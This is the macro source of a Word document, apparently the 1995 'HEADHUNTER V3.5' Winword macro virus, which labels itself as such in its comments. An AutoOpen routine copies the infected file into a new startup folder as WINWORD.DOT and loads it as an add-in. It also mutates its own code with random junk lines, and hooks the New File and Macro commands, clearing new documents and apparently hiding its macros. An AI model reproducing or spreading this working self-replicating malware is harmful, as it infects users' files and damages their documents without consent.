   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ExtrasMakro"

   Public Sub Main()
   Attribute Main.VB_Description = "Erstellt, löscht und überarbeitet einen Makro oder führt ihn aus."
   Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.ExtrasMakro.Main"
   On Error GoTo -1: On Error GoTo Exit_
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
   WordBasic.CurValues.ToolsMacro dlg
   dlg.Show = 1
   WordBasic.Dialog.ToolsMacro dlg
   WordBasic.ToolsMacro dlg
   Exit_:
   End Sub

   Attribute VB_Name = "DateiNeu"

   Public Sub Main()
   Attribute Main.VB_Description = "Erstellt ein neues Dokument oder eine Dokumentvorlage."
   Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.DateiNeu.Main"
   Dim TOYDMGUO
   Dim F242$
   Dim GUGASYN
   On Error GoTo -1: On Error GoTo Exit_
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileNew(False)
   WordBasic.CurValues.FileNew dlg

   TOYDMGUO = 128

   WordBasic.Dialog.FileNew dlg
   F242$ = WordBasic.[DefaultDir$](8) + "\WINWORD.DOT"
   If WordBasic.[Files$](F242$) <> "" Then
    dlg.Template = F242$
    dlg.NewTemplate = 1
   End If
   WordBasic.FileNew dlg
   WordBasic.EditSelectAll
   WordBasic.WW6_EditClear

   GUGASYN = 170

   Exit_:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub Main()
   Dim f$
   Dim m
   Dim WIBZBOT
   Dim i
   Dim a$
   Dim F242$
   On Error GoTo -1: On Error GoTo Exit_

   Rem ***********************************************************************
   Rem ***      <HEADHUNTER V3.5> by Neurobasher, 5.11.1995, Germany       ***
   Rem *** Boring experimental Winword virus with minor poly/retro/stealth ***
   Rem ***********************************************************************
   Rem *** "I'm looking for a man who knows the rules of the game"         ***
   Rem *** "Who's able to forget them to realize my aim"                   ***
   Rem ***********************************************************************

   If WordBasic.Second(WordBasic.Now()) < 5 Then
    WordBasic.ScreenUpdating
    Select Case WordBasic.Int(Rnd() * 2)
     Case 0
       f$ = "AutoOpen"
       m = 30
     Case 1
       f$ = "DateiNeu"

   WIBZBOT = 197

       m = 15
     Case 2
       f$ = "ExtrasMakro"
       m = 10
    End Select
    WordBasic.ToolsMacro Name:=f$, Edit:=1, Show:=3
    WordBasic.ParaDown WordBasic.Int(Rnd() * m) + 1
    For i = 1 To WordBasic.Int(Rnd() * 10) + 2
     a$ = a$ + Chr(WordBasic.Int(Rnd() * 26) + 65)
    Next i
    WordBasic.Insert Chr(13) + a$ + " =" + Str(WordBasic.Int(Rnd() * 242)) + Chr(13) + Chr(13)
    WordBasic.DocClose 1
    WordBasic.FileSave
    WordBasic.ScreenUpdating 1
   End If

   If WordBasic.[DefaultDir$](8) = "" Then
    WordBasic.MkDir WordBasic.[DefaultDir$](9) + "\AutoStrt"
    WordBasic.ChDefaultDir WordBasic.[DefaultDir$](9) + "\AutoStrt", 8
   End If

   F242$ = WordBasic.[DefaultDir$](8) + "\WINWORD.DOT"
   If WordBasic.[Files$](F242$) = "" Then
    WordBasic.CopyFile WordBasic.[FileName$](), F242$
    WordBasic.AddAddIn F242$, 1
   End If

   Exit_:
   End Sub
